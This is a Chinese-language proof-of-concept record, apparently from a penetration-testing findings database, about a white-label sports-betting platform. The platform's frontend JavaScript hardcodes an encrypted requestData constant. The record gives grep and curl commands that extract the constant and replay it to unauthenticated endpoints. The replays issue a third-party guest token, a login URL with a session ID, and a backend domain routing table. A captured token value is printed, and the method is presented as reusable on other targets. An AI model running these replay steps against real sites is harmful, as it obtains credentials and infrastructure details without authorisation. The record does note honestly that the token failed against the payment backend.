# 前端硬编码 requestData 常量重放 → 未授权签发第三方平台 token 与线路域名路由表

- **code**: 前端硬编码-requestdata-常量重放-未授权签发第三方平台-token-与线路域名路由表
- **kind**: script
- **category**: info-leak
- **component**: 白标体育供应商 guest token 服务 + 前端硬编码 requestData 常量
- **language**: bash
- **source**: self
- **verified**: 1
- **verified_note**: 在 example.com 实测（无任何 Cookie，经代理出口 203.0.113.2）：/ob/v2/getTryToken + product=rb + 704 字符 requestData 常量 → 200 返回 token=8b2af1ff66e9aceb5e5b4d981ac82e1a332ed22b、userId=528925123876225549、可直接登录的 loginUrl（含 sessionId）、apiDomain/apiDomainList/imgDomain；连打三次 token 与 userId 恒定、仅 sessionId 递增 → 固定静态凭据。/fbsport/v1/getToken 同常量 → 200 返回 12 组线路域名（两次采集合计 20 个，含 wss://target305.example.com、https://target310.example.com、https://example.com、4 个 API 域等）。/common/v1/hotLegues/getHotLegues → 200 返回 36911 字节真实赛事数据。对照：json 编码 → 50040 系统错误（必须 form）。**如实边界**：token 能否在第三方平台真正建立登录会话未实测（未打开 loginUrl）；追加 userId/uid/obUserId 参数无法指定他人身份（全部 50040）；用 header token / token_x / Authorization: Bearer / Cookie 四类方式共 9 次打业务后端 /api/refreshUserInSession 与 /api/withdrawlNewV2，**全部返回 20000 未登录 → RB88 资金后端不认该 token，不构成认证绕过**。
- **path**: pocs/前端硬编码-requestdata-常量重放-未授权签发第三方平台-token-与线路域名路由表/hardcoded_requestdata_replay.sh
- **tags**: 硬编码常量,requestData,重放,guest token,未授权,fakerToken,线路域名路由表,白标供应商,体育平台
- **created_at**: 2026-10-10T18:59:42.307Z
- **found_by**: exploit

## 描述

通用手法：白标/供应商型 SPA 把取 guest token 的加密请求体硬编码在前端 JS，前端只做原样发出 → 任何人复制该常量即可无凭据重放，换取第三方平台 token、可直连 loginUrl 与完整线路后端域名路由表。含定位命令、必须用 form 编码的坑、token 恒定性与"能否反认业务后端"的判定要点，以及必须保留的如实边界。

## 用法

```
1) 从目标主包 grep 出 FAKER_TOKEN_BASE_URL 与 requestData 常量；2) 用 form 编码（application/x-www-form-urlencoded）POST 到 /ob/v2/getTryToken 与 /fbsport/v1/getToken；3) 连打 3 次看 token 是否恒定（恒定=固定静态凭据）；4) 追加 userId 参数测能否指定他人身份；5) 用 header token/token_x/Authorization/Cookie 四类方式打业务站鉴权接口，确认是否构成业务后端认证绕过。json 编码会返回业务错误，务必用 form。
```

## 正文

```
# 「前端硬编码 requestData 常量重放 → 未授权签发第三方平台 token」通用手法

## 原理
白标/供应商型 SPA 常把"取 guest token"的加密请求体**硬编码在前端 JS 里**（因为它对所有用户都一样）。
前端只做"原样发出"，不需要本地加密 → **任何人复制该常量即可重放**，无需凭据、无需逆出密钥。

## 定位常量
```bash
# 1) 拿主包（HTML 里 modulepreload / preload as=script 的那个 index-*.js）
curl -s https://TARGET/ | grep -oE '/assets/[A-Za-z0-9_.-]+\.js'
# 2) 找 fakerToken / getToken / getTryToken 的调用点，抽出 requestData 常量
grep -oE '(FAKER_TOKEN|FAKER_TOKEN_BASE_URL)[^;]{0,400}' index.js
grep -oE 'requestData:"([A-Za-z0-9+/=]{40,})"' index.js
# 3) 取服务地址：grep -oE 'FAKER_TOKEN_BASE_URL:"[^"]+"' index.js
```

## 重放（关键：绝大多数这类服务**只认 form 编码**，json 会返回业务错误）
```bash
BASE='https://<FAKER_TOKEN_BASE_URL 的域名>'
BLOB='<上一步抽出的 requestData 值>'

# A) 签 guest 体育 token（返回 token / userId / loginUrl / sessionId / apiDomainList）
curl -sk -X POST "$BASE/ob/v2/getTryToken" \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'product=rb' --data-urlencode "requestData=$BLOB"

# B) 取线路后端域名路由表（12 组 / 20 个域名，含 wss 推送、H5、PC、静态、播放器、订单详情、API）
curl -sk -X POST "$BASE/fbsport/v1/getToken" \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode "requestData=$BLOB"

# C) 若还有 /common/v1/* 数据接口，同法重放
curl -sk -X POST "$BASE/common/v1/hotLegues/getHotLegues" \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode "requestData=$BLOB"
```

## 判定要点
- **token 是否恒定**：连打 3 次，若 token/userId 完全一致、仅 sessionId（=userId+毫秒戳+计数）递增
  → 是**固定静态凭据**，写在公开 JS 里被所有用户共享；
- **能否指定他人身份**：追加 `userId/uid/obUserId` 参数，若返回业务错误（无法指定）→ 不能拿别人身份；
- **该 token 能否反向认证业务后端**：用 header `token` / `token_x` / `Authorization: Bearer` / `Cookie` 四类
  注入方式打业务站的鉴权接口（如 /api/refreshUserInSession），若全部返回"未登录"→ **不构成业务后端认证绕过**。

## 如实边界（照抄进报告，勿夸大）
- token 能否在第三方平台**真正建立登录会话未实测**（loginUrl 指向真实账号会话，不应打开）；
- 已验证的只是"未认证即可获取该 token 与可直接登录的 URL + sessionId"以及"token 为固定值"；
- **不构成资金/业务后端的认证绕过**（实测业务后端不认该 token）。

```
